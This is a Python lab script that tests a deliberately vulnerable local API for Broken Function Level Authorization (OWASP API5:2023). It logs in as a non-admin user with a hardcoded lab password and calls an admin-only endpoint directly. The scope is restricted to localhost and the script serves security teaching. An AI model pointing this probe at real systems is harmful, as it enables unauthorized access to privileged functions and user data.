"""
function_auth_tester.py -- API5:2023 Broken Function Level Authorization (BFLA) Checker
=========================================================================================

LEGAL / ETHICAL SCOPE
----------------------
Talks ONLY to http://127.0.0.1:5000 (vulnerable_api.py, run by you). Do not
point this at any other host.

WHAT THIS DEMONSTRATES
------------------------
Logs in as an ordinary, non-admin user ("bob") and calls the admin-only
GET /api/admin/users endpoint directly with bob's own token -- simulating an
attacker who noticed the endpoint (e.g. in decompiled mobile client code or
a JS bundle, per note 15's API/mobile crossover) even though the app UI never
shows an "Admin" button for bob's role. If the call succeeds (HTTP 200) that
confirms the server relies on a client-side/UI-only gate instead of an
independent server-side role check -- Broken Function Level Authorization.
"""

from __future__ import annotations

import requests

TARGET = "http://127.0.0.1:5000"  # local lab target ONLY -- do not change


def _login(username: str, password: str) -> tuple[str, str]:
    resp = requests.post(f"{TARGET}/api/login", json={"username": username, "password": password})
    resp.raise_for_status()
    body = resp.json()
    return body["token"], body["role"]


def check_bfla(regular_user=("bob", "bobsecretpw")) -> dict:
    print("[*] BFLA check -- API5:2023 Broken Function Level Authorization")
    print(f"    Logging in as a REGULAR (non-admin) user: {regular_user[0]}...")
    token, role = _login(*regular_user)
    print(f"    Confirmed role='{role}' (not admin). Now calling the admin-only")
    print("    GET /api/admin/users endpoint directly with this non-admin token...")

    resp = requests.get(
        f"{TARGET}/api/admin/users",
        headers={"Authorization": f"Bearer {token}"},
    )

    finding = {
        "id": "API5:2023-BFLA",
        "title": "Broken Function Level Authorization on GET /api/admin/users",
        "confirmed": False,
        "evidence": "",
    }

    if resp.status_code == 200 and role != "admin":
        data = resp.json()
        finding["confirmed"] = True
        finding["evidence"] = (
            f"Authenticated as '{regular_user[0]}' with role='{role}' (non-admin), called "
            f"GET /api/admin/users and received HTTP 200 with {data!r} -- the admin-only "
            f"endpoint has no server-side role check, so this should have been HTTP 403."
        )
        print(f"    [!] VULNERABLE: HTTP 200 returned admin data to a non-admin user: {data}")
    else:
        finding["evidence"] = f"HTTP {resp.status_code} -- server correctly rejected the non-admin caller."
        print(f"    [+] Not vulnerable here: server responded HTTP {resp.status_code} (correct behavior).")

    print()
    return finding


if __name__ == "__main__":
    result = check_bfla()
    print(result)
